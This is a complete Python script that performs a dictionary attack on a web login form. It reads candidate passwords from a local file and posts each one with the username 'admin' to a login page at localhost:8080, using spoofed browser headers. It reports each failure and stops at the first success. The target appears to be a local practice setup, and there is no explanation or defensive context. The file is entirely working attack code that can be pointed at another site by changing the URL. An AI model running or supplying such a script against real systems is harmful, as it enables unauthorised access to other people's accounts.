# sources: https://curlconverter.com/
import requests

def dictionary_attack(headers, url, passwords):
   
    data = {
        'username': 'admin',
        'password': ''
    }
    
    for password in passwords:
        data['password'] = password
        response = requests.post(url, headers=headers, data=data)
        if('<h2>ACCESS DENIED</h2>' in response.text):
            print(f'FAILED: {password} not correct')
        else:
            print(f'SUCCESS: {password} correct')
            break
    return data['password']

def read_passwords_file(filepath):
    passwords = []
    f = open(filepath, 'r')
    for line in f:
        passwords.append(line.split(' ')[1])

    return passwords


if __name__ == "__main__":
    headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US,en;q=0.9',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    'Origin': 'http://localhost:8080',
    'Referer': 'http://localhost:8080/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"macOS"',
}
    login_url = 'http://localhost:8080/login'
    filepath = './passwords.txt'
    passwords = read_passwords_file(filepath=filepath)
    dictionary_attack(headers=headers, url=login_url, passwords=passwords)